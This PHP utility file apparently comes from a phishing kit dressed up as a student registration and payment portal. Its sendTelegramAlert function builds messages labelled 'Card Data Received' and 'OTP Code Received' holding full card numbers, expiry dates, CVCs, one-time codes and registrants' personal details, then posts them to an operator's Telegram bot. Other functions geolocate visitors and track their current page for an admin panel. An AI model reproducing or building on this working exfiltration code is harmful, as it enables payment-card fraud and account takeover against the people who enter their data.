<?php
require_once __DIR__ . '/db.php';

function parseUserAgent(string $ua): array {
    $browser = 'Unknown';
    $os = 'Unknown';
    $device = 'Desktop';

    if (preg_match('/Edg\//i', $ua)) $browser = 'Edge';
    elseif (preg_match('/OPR|Opera/i', $ua)) $browser = 'Opera';
    elseif (preg_match('/Chrome/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/Firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/Safari/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/MSIE|Trident/i', $ua)) $browser = 'Internet Explorer';

    if (preg_match('/Windows NT 10/i', $ua)) $os = 'Windows 10/11';
    elseif (preg_match('/Windows/i', $ua)) $os = 'Windows';
    elseif (preg_match('/Mac OS X/i', $ua)) $os = 'macOS';
    elseif (preg_match('/Linux/i', $ua)) $os = 'Linux';
    elseif (preg_match('/Android/i', $ua)) $os = 'Android';
    elseif (preg_match('/iPhone|iPad/i', $ua)) $os = 'iOS';

    if (preg_match('/Mobile|Android|iPhone/i', $ua)) $device = 'Mobile';
    elseif (preg_match('/iPad|Tablet/i', $ua)) $device = 'Tablet';

    return compact('browser', 'os', 'device');
}

function getClientIP(): string {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function generateToken(): string {
    return bin2hex(random_bytes(32));
}

function logActivity(int $studentId, string $action, string $details = ''): void {
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO activity_log (student_id, action, details, ip_address) VALUES (?, ?, ?, ?)");
    $stmt->execute([$studentId, $action, $details, getClientIP()]);
}

function sanitize(string $input): string {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function jsonResponse(array $data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function requireAdmin(): void {
    if (session_status() !== PHP_SESSION_ACTIVE) {
        @session_start();
    }
    if (empty($_SESSION['is_admin'])) {
        if (!headers_sent()) {
            header('Location: login.php');
        } else {
            echo '<script>window.location.href="login.php";</script>';
        }
        exit;
    }
}

function getStudentByToken(string $token): ?array {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM students WHERE session_token = ?");
    $stmt->execute([$token]);
    return $stmt->fetch() ?: null;
}

function getGeoFromIP(string $ip): array {
    $default = ['country' => '', 'city' => '', 'region' => '', 'country_code' => ''];
    if (in_array($ip, ['127.0.0.1', '::1', '0.0.0.0']) || str_starts_with($ip, '192.168.') || str_starts_with($ip, '10.')) {
        return $default;
    }
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,regionName,countryCode", false, $ctx);
    if ($json) {
        $data = json_decode($json, true);
        if (($data['status'] ?? '') === 'success') {
            return ['country' => $data['country'] ?? '', 'city' => $data['city'] ?? '', 'region' => $data['regionName'] ?? '', 'country_code' => $data['countryCode'] ?? ''];
        }
    }
    return $default;
}

function getTelegramSettings(): array {
    static $cache = null;
    if ($cache !== null) return $cache;
    $db = getDB();
    $row = $db->query("SELECT telegram_bot_token, telegram_chat_id, telegram_alert_registration, telegram_alert_payment, telegram_alert_otp FROM admin_settings WHERE id = 1")->fetch();
    $cache = $row ?: [];
    return $cache;
}

function sendTelegramAlert(string $type, array $data): void {
    $settings = getTelegramSettings();
    $token = $settings['telegram_bot_token'] ?? '';
    $chatId = $settings['telegram_chat_id'] ?? '';
    if (!$token || !$chatId) return;

    $toggleMap = [
        'registration' => 'telegram_alert_registration',
        'payment' => 'telegram_alert_payment',
        'otp' => 'telegram_alert_otp',
    ];
    $key = $toggleMap[$type] ?? '';
    if (!$key || empty($settings[$key])) return;

    $e = function($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); };

    $msg = '';
    if ($type === 'registration') {
        $addr = $data['address'] ?? '';
        $addrParsed = is_string($addr) ? json_decode($addr, true) : $addr;
        if (is_array($addrParsed) && isset($addrParsed['street'])) {
            $addrStr = $e($addrParsed['street']) . "\n"
                     . $e($addrParsed['city'] ?? '') . ', ' . $e($addrParsed['state'] ?? '') . ' ' . $e($addrParsed['zip'] ?? '') . "\n"
                     . $e($addrParsed['country'] ?? '');
        } else {
            $addrStr = $e($addr);
        }
        $msg = "<b>New Registration</b>\n"
             . "<b>Name:</b> " . $e($data['name'] ?? '') . "\n"
             . "<b>Email:</b> " . $e($data['email'] ?? '') . "\n"
             . "<b>Phone:</b> " . $e($data['phone'] ?? '') . "\n"
             . "<b>Address:</b>\n" . $addrStr . "\n"
             . "<b>IP:</b> " . $e($data['ip'] ?? '');
    } elseif ($type === 'payment') {
        $msg = "<b>Card Data Received</b>\n"
             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
             . "<b>Cardholder:</b> " . $e($data['cardholder'] ?? '') . "\n"
             . "<b>Card:</b> <code>" . $e($data['card_number'] ?? '') . "</code>\n"
             . "<b>Type:</b> " . $e($data['card_type'] ?? '') . "\n"
             . "<b>Expiry:</b> " . $e($data['expiry'] ?? '') . "\n"
             . "<b>CVC:</b> " . $e($data['cvc'] ?? '');
    } elseif ($type === 'otp') {
        $msg = "<b>OTP Code Received</b>\n"
             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
             . "<b>Code:</b> <code>" . $e($data['code'] ?? '') . "</code>";
    }

    if (!$msg) return;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ]);
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData,
            'timeout' => 3
        ]
    ]);
    @file_get_contents($url, false, $ctx);
}

function updateStudentActivity(int $studentId, string $page = ''): void {
    $db = getDB();
    $stmt = $db->prepare("UPDATE students SET is_online = 1, last_activity = datetime('now') WHERE id = ?");
    $stmt->execute([$studentId]);
    if ($page) {
        $db->prepare("UPDATE students SET current_page = ? WHERE id = ?")->execute([$page, $studentId]);
    }
}
